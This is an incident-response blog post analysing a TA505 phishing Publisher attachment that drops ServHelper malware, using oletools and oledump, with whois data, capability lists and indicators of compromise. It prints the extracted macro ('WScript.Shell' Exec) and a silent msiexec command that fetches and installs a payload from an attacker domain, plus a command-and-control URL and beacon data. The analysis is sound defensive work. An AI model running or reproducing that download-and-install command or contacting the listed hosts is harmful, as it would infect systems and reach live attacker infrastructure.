---
layout: post
title:  "TA505 and Servhelper Malware"
description: "A walkthrough on analysising a suspicious mail attachment to the discovery and identification of malware"
date:   2019-01-17 10:49:33 +0000
tags: [Malware, Incident Response]
---

As our analysis begins on the phishing email we additionally have a suspicious document (or .pub, .wiz). 
If we open the document with macros disabled it should safely open and look similar to this one:

![suspicious word doc](/assets/TA505_doc.png)

After looking at the macros, the code looks relatively clean, but we wont be fooled by OLE Streams.
OLE or Object Linking and Embedding is another mechanism which attackers can abuse to obfuscate and hide malware
within Microsoft Office documents - despite its legitimate purpose.

So how do we scan for OLE objects?

## Introducing oletools

Using the opensource package oletools we can quickly scan the document(or .pub) for suspicious/malicious calls:
 * [Download oletools](https://www.decalage.info/python/oletools)

```
$ olevba --decode ~/invoice.pub 
...abbrev...
-------------------------------------------------------------------------------
VBA FORM Variable "TextBox1" IN 'invoice.pub' - OLE stream: u'VBA/ZclBlack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Set arabsky = CreateObject("WScript.Shell")
arabsky.Exec("AAA")
+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | Document_Open        | Runs when the Word or Publisher         |
|            |                      | document is opened                      |
| Suspicious | Shell                | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | WScript.Shell        | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | run                  | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | CreateObject         | May create an OLE object                |
| Suspicious | sample               | May detect Anubis Sandbox               |
| Suspicious | Hex Strings          | Hex-encoded strings were detected, may  |
|            |                      | be used to obfuscate strings (option    |
|            |                      | --decode to see all)                    |
| Suspicious | Base64 Strings       | Base64-encoded strings were detected,   |
|            |                      | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| IOC        | notepad.exe          | Executable file name                    |
| Hex String | '\t\xfd.\xff'        | 09FD2EFF                                |
| Hex String | '\x00\xc0O\x8e\xf3-' | 00C04F8EF32D                            |
| Hex String | '\xba\xda\xe2\x11'   | badae211                                |
| Hex String | '\xba\xda\xe2\x12'   | badae212                                |
| Hex String | '\xba\xda\xe24'      | badae234                                |
| Hex String | '\xd9!\xcb\x9a'      | D921CB9A                                |
| Hex String | '\xf1U\xc6\xae\xa09' | F155C6AEA039                            |
| Hex String | '<%\xe1@'            | 3C25E140                                |
| Hex String | '\xe6A\xbc\x90\xa2{' | E641BC90A27B                            |
| Base64     | =>L                  | PT5M                                    |
| String     |                      |                                         |
| Base64     | 'e\xc9A\x95\xa7$'    | ZclBlack                                |
| String     |                      |                                         |
+------------+----------------------+-----------------------------------------+
```

Here we can see a few interesting calls that indeed alert us to this document being suspicious/malicious:
 * Document_Open 
 * WScript.Shell 
 * Numerous hex strings
 
**Note** The attacker has even tried to fool analysts by pretending that the macro potenital opens Notepad.exe

### Back to extracting OLE Streams

Didier Stevens open-sourced a good tool for this job: oledump By default it will list and index all embedded OLE objects.
* [Download oledump-py](https://blog.didierstevens.com/programs/oledump-py/)

```
$ ./oledump.py  ~/invoice.pub 
  1:        94 '\x01CompObj'
  2:        12 '\x03Internal'
  3:       152 '\x05DocumentSummaryInformation'
  4:     16384 '\x05SummaryInformation'
  5:     10404 'Contents'
  6:         0 'Envelope'
  7:     25748 'Escher/EscherDelayStm'
  8:      1868 'Escher/EscherStm'
  9:        86 'Quill/QuillSub/\x01CompObj'
 10:      3584 'Quill/QuillSub/CONTENTS'
 11:       485 'VBA/PROJECT'
 12:        68 'VBA/PROJECTwm'
 13: M    9253 'VBA/VBA/ThisDocument'
 14: m    1159 'VBA/VBA/ZclBlack'
 15:      3940 'VBA/VBA/_VBA_PROJECT'
 16:       789 'VBA/VBA/dir'
 17:        97 'VBA/ZclBlack/\x01CompObj'
 18:       376 'VBA/ZclBlack/\x03VBFrame'
 19:       407 'VBA/ZclBlack/f'
 20:       348 'VBA/ZclBlack/o'
```
 
There are a number of interesting looking **ZclBlack** objects, so we will take a closer look at these
 
```
 $ ./oledump.py  -s 19 ~/invoice.pub 
...
00000070: 00 00 00 00 00 15 00 4C  61 62 65 6C 31 00 00 43  .......Label1..C
00000080: 3A 5C 57 69 6E 64 6F 77  73 5C 53 79 73 74 65 6D  :\Windows\System
00000090: 33 32 5C 6D 73 69 65 78  65 63 2E 65 78 65 00 D9  32\msiexec.exe..
000000A0: 13 00 00 AB 14 00 00 00  00 3C 00 F7 01 00 00 06  .........<......
000000B0: 00 00 80 0D 00 00 80 0A  00 00 00 32 00 00 00 38  ...........2...8
000000C0: 00 00 00 01 00 15 00 4C  61 62 65 6C 32 00 00 57  .......Label2..W
000000D0: 73 63 72 69 70 74 2E 53  68 65 6C 6C 00 00 00 D9  script.Shell....
000000E0: 13 00 00 0E 0E 00 00 00  00 38 00 F7 01 00 00 06  .........8......
...
```

```
$ ./oledump.py  -s 20 ~/invoice.pub 
...
000000F0: 40 00 00 80 CE 18 00 00  8B 07 00 00 53 65 74 20  @...........Set 
00000100: 61 72 61 62 73 6B 79 20  3D 20 43 72 65 61 74 65  arabsky = Create
00000110: 4F 62 6A 65 63 74 28 22  57 53 63 72 69 70 74 2E  Object("WScript.
00000120: 53 68 65 6C 6C 22 29 0D  0A 61 72 61 62 73 6B 79  Shell")..arabsky
00000130: 2E 45 78 65 63 28 22 41  41 41 22 29 00 02 1C 00  .Exec("AAA")....
00000140: 37 00 00 00 06 00 00 80  00 20 00 40 A5 00 00 00  7........ .@....
00000150: CC 02 00 00 54 61 68 6F  6D 61 00 00              ....Tahoma..
```

```
$ ./oledump.py  -s 18 ~/invoice.pub 
00000000: 56 45 52 53 49 4F 4E 20  35 2E 30 30 0D 0A 42 65  VERSION 5.00..Be
00000010: 67 69 6E 20 7B 43 36 32  41 36 39 46 30 2D 31 36  gin {C62A69F0-16
00000020: 44 43 2D 31 31 43 45 2D  39 45 39 38 2D 30 30 41  DC-11CE-9E98-00A
00000030: 41 30 30 35 37 34 41 34  46 7D 20 5A 63 6C 42 6C  A00574A4F} ZclBl
00000040: 61 63 6B 20 0D 0A 20 20  20 43 61 70 74 69 6F 6E  ack ..   Caption
00000050: 20 20 20 20 20 20 20 20  20 3D 20 20 20 22 55 73           =   "Us
00000060: 65 72 46 6F 72 6D 31 22  0D 0A 20 20 20 43 6C 69  erForm1"..   Cli
00000070: 65 6E 74 48 65 69 67 68  74 20 20 20 20 3D 20 20  entHeight    =  
00000080: 20 33 31 38 30 0D 0A 20  20 20 43 6C 69 65 6E 74   3180..   Client
00000090: 4C 65 66 74 20 20 20 20  20 20 3D 20 20 20 34 35  Left      =   45
000000A0: 0D 0A 20 20 20 43 6C 69  65 6E 74 54 6F 70 20 20  ..   ClientTop  
000000B0: 20 20 20 20 20 3D 20 20  20 33 37 35 0D 0A 20 20       =   375..  
000000C0: 20 43 6C 69 65 6E 74 57  69 64 74 68 20 20 20 20   ClientWidth    
000000D0: 20 3D 20 20 20 34 37 31  30 0D 0A 20 20 20 53 74   =   4710..   St
000000E0: 61 72 74 55 70 50 6F 73  69 74 69 6F 6E 20 3D 20  artUpPosition = 
000000F0: 20 20 31 20 20 27 43 65  6E 74 65 72 4F 77 6E 65    1  'CenterOwne
00000100: 72 0D 0A 20 20 20 54 61  67 20 20 20 20 20 20 20  r..   Tag       
00000110: 20 20 20 20 20 20 3D 20  20 20 22 6B 3D 34 20 64        =   "k=4 d
00000120: 3D 34 20 7A 3D 31 31 31  20 2F 71 20 2F 6E 6F 72  =4 z=111 /q /nor
00000130: 65 73 74 61 72 74 20 2F  69 20 68 74 74 70 3A 2F  estart /i http:/
00000140: 2F 6F 66 66 69 63 65 68  6F 6D 65 6D 73 2E 63 6F  /officehomems.co
00000150: 6D 2F 6C 73 6D 22 0D 0A  20 20 20 54 79 70 65 49  m/lsm"..   TypeI
00000160: 6E 66 6F 56 65 72 20 20  20 20 20 3D 20 20 20 32  nfoVer     =   2
00000170: 30 0D 0A 45 6E 64 0D 0A                           0..End..
```

Simplified version:
 * msiexec k=4 d=4 z=111 /q /norestart /i http://officehomems.com/lsm

By inserting the URL into VirusTotal we can gather evidence that confirms our suspicions that this is an attack
 * [VT Sample 38a6fbf7c370b7cc1d95aff221833e1e66b915d00b360d6f071ad8664d476f5e](https://www.virustotal.com/#/url/38a6fbf7c370b7cc1d95aff221833e1e66b915d00b360d6f071ad8664d476f5e/detection)

![VT on sample](/assets/TA505_38a.png)

Next we perform our research against the URL and the domain name:
```
dig officehomems.com +short
54.38.15.250
```

Whois Records:

```
The Registry database contains ONLY .COM, .NET, .EDU domains and
Registrars.
Domain Name: OFFICEHOMEMS.COM
Registry Domain ID: 2328611896_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.imena.ua
Registrar URL: http://imena.ua
Updated Date: 2018-11-29T14:48:21Z
Creation Date: 2018-11-02T05:44:13Z
Registrar Registration Expiration Date: 2019-11-02T05:44:13Z
Registrar: Internet Invest, Ltd. dba Imena.ua
Registrar IANA ID: 1112
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Domain Status: clientHold https://icann.org/epp#clientHold
Registry Registrant ID: Not Available From Registry
Registrant Name: Whois privacy protection service
Registrant Organization: Internet Invest, Ltd. dba Imena.ua
Registrant Street: Gaidara, 50 st.   
Registrant City: Kyiv
Registrant State/Province: Kyiv
Registrant Postal Code: 01033
Registrant Country: UA
Registrant Phone: +380.442010102
Registrant Phone Ext: 
Registrant Fax: +380.442010100
Registrant Fax Ext: 
Registrant Email: hostmaster@imena.ua
Registry Admin ID: Not Available From Registry
Admin Name: Whois privacy protection service
```

## A Tale of Two Payloads

By the time we got this far in the investigation, we noticed that the attackers had modified their email address, subject lines and payload/attachments.

We deduce that this is due to a large number of bounced emails, as the anti-spam filters kick into action and block the first sample. 
Is the attacker actively monitoring their mailserver? or is this purely automated?

So now we have two variants to analyse:
 * [https://www.virustotal.com/#/file/3fb3b69917db8434655298eed9ce269b6b6029c275b38fa8eda9d8a3cd415b39/detection](3fb3b69917db8434655298eed9ce269b6b6029c275b38fa8eda9d8a3cd415b39)
 * [https://www.virustotal.com/#/file/4ce82644eaa1a00cdb6e2f363743553f2e4bd1eddb8bc84e45eda7c0699d9adc/detection](4ce82644eaa1a00cdb6e2f363743553f2e4bd1eddb8bc84e45eda7c0699d9adc)

Again, a quick search on Virus Total reveals these are indeed Trojan pieces of code:
![VT on sample](/assets/TA505_3fb.png)
![VT on sample](/assets/TA505_4ce.png)

### Varient 1 

 * Dropper URL: http://officehomems.com/lsm
 * lsm.msi (Packer EnigmaProtector)
 * %TEMP%\Data1\lsm.exe (registered as a service)
 * sha256 fb3b69917db8434655298eed9ce269b6b6029c275b38fa8eda9d8a3cd415b39
 * size: 305KiB
 * Timestamp 2 Nov 2018

#### API Functions
* SystemInfo enum
* User enum (local & domain)
* Keylogger
* Privilege Escaltion via Token stealing and manipulation
* Send/Receive Files
* Enumerate WiFi / steal WiFi key
* Persistance via registry Microsoft\Windows\CurrentVersion\Run
* Screen capture
* Checks if virtualbox / virtualbox plugins is/are installed
* Raids browser cookies in chrome and firefox (cookies.sqlite)
* Uses volume shadow copy (vssvc.exe) to create a shadow copy

###varient 2

 * Dropper URL: mshomebox365.com/plugin
 * storsvc.exe 
 * %TEMP%\Data1\storsvc.exe (registered as a service)
 * sha256 419ffcb88cfe2441b782c7afbf0309c591fb13de59a20252519decac2c9a9d85
 * size: 308KiB
 * Timestamp 2 Nov 2018

Whois Record (Same Actor):

```
The Registry database contains ONLY .COM, .NET, .EDU domains and
Registrars.
Domain Name: MSHOMEBOX365.COM
Registry Domain ID: 2328303647_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.imena.ua
Registrar URL: http://imena.ua
Updated Date: 2018-11-29T14:48:31Z
Creation Date: 2018-11-01T09:07:11Z
Registrar Registration Expiration Date: 2019-11-01T09:07:11Z
Registrar: Internet Invest, Ltd. dba Imena.ua
Registrar IANA ID: 1112
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
Domain Status: clientHold https://icann.org/epp#clientHold
Registry Registrant ID: Not Available From Registry
Registrant Name: Whois privacy protection service
Registrant Organization: Internet Invest, Ltd. dba Imena.ua
Registrant Street: Gaidara, 50 st.   
Registrant City: Kyiv
Registrant State/Province: Kyiv
Registrant Postal Code: 01033
Registrant Country: UA
Registrant Phone: +380.442010102
Registrant Phone Ext: 
Registrant Fax: +380.442010100
Registrant Fax Ext: 
Registrant Email: hostmaster@imena.ua
Registry Admin ID: Not Available From Registry
Admin Name: Whois privacy protection service
Admin Organization: Internet Invest, Ltd. dba Imena.ua
```

#### API Functions
API from delphi based program:
* from Win32_ComputerSystem
* GenerateIdKey
* get token information
* get_Azure
* get_botnetAdress
* get_botnetServerRequestRetryDelay
* get_command
* get_commandsManager
* get_Data
* get_debug
* get_ip
* get_Is64BitOperatingSystem
* get_IsCompleted
* get_keyLoggerManager
* get_MachineName
* get_Now
* get_OSVersion
* get_Owner
* ... more...

## Command and Control
Botnet URL:
* http://89.144.25.16/backnet/

Through further analysis of the binaries, and PCAP dumps from Cuckoo, we can see that the payload is dialling home using POST requests.
Unfortunately, there is no response? for us to continue the dynamic analysis into the Command and Control Server.

Post Data – sends repeatidly – no reply observed? :

```
data={"host_key":"711a0c25f2ec62880fa8a7afe2bf90adfe28c0b23eb0a536147529ffacb66dae","name":"admin@PC"}
```

## Conclusion
Cross-referencing with the proofpoint article we can see that this matches their analysis of the **November 15 “Downloader” Campaign** 

## References
* [https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505](https://www.proofpoint.com/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505)

## IoCs

| url | officehomems.com,officehomems.com/lsm | 54.38.15.250 |
| url | mshomebox365.com,mshomebox365.com/plugin | 185.17.121.194 |
| url |  89.144.25.16/backnet/ | 89.144.25.16 |
| hashes |fb3b69917db8434655298eed9ce269b6b6029c275b38fa8eda9d8a3cd415b39 | lsm.msi|
| hashes |419ffcb88cfe2441b782c7afbf0309c591fb13de59a20252519decac2c9a9d85 | storsvc.msi|
| dropper | %TEMP%\Data1\lsm.exe | Timestamp 2 Nov 2018 |
| dropper | %TEMP%\Data1\storsvc.exe| Timestamp 2 Nov 2018 |
| OLE/VBA | VBA/ZclBlack | |